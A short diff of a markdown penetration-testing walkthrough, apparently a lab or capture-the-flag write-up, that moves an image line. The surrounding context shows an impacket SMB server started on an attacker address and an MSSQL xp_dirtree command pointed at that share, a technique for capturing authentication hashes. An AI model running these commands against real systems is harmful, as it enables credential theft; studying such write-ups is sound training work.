@@ -148,11 +148,10 @@ Which means we should search for other way of exploitation:
 sudo impacket-smbserver share ./ -smb2support
 ```
 
-![image.png](image%2010.png)
-
 ```bash
 exec xp_dirtree '\\10.10.14.6\share\', 1, 1
 ```
+![image.png](image%2010.png)
 
 Checking connection with netxec:
 
